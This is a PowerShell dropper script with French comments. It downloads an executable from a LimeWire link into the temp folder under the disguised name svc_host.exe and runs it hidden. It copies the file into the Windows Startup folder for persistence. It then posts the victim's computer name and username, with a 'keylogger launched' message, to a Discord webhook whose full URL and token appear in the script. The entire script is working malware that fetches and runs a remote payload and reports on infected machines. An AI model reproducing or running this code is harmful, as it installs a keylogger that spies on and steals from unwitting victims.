$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
$exeUrl = "https://limewire.com/d/FDphV#TmLbLMqVie"
$exePath = "$env:TEMP\svc_host.exe"

# Télécharge (si pas déjà fait)
if (!(Test-Path $exePath)) {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
}

# LANCE DIRECTEMENT (c’est ça qui manquait)
Start-Process -FilePath $exePath -WindowStyle Hidden

# Persistance (au cas où)
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svc_host.exe"
if (!(Test-Path $startup)) { Copy-Item $exePath $startup -Force }

# Log Discord
try {
    $body = @{ content = "Keylogger lancé sur $env:COMPUTERNAME ($env:USERNAME)" } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
} catch {}
